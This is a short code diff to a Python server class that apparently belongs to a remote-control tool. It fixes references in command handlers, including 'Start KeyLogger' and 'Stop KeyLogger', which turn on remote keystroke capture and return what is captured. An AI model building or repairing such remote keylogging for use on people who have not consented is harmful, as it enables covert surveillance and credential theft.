@@ -35,6 +35,7 @@ class Server():
             protocol="tcp",
             pattern=1,
             logging=False,
+            retCh=True,
             **options
         )
 
@@ -92,11 +93,11 @@ class Server():
                             self.server.inpListener.blockInput = False
 
                         elif cmd == "Start KeyLogger":
-                            self.inpListener.grabKeyInput = True
+                            self.server.inpListener.grabKeyInput = True
                             self.additional_data = self.server.inpListener.fetch
 
                         elif cmd == "Stop KeyLogger":
-                            self.inpLitener.grabKeyInput = False
+                            self.server.inpListener.grabKeyInput = False
                             self.additional_data = lambda: None
 
                         elif cmd == "Width Change":
@@ -125,7 +126,7 @@ class Server():
     def close(self):
         self.__running = False
         self.__proc.join()
-        self.inpListener.stop()
+        self.server.inpListener.stop()
         self.executor.close()
         self.stream.stop()
         self.server.close()
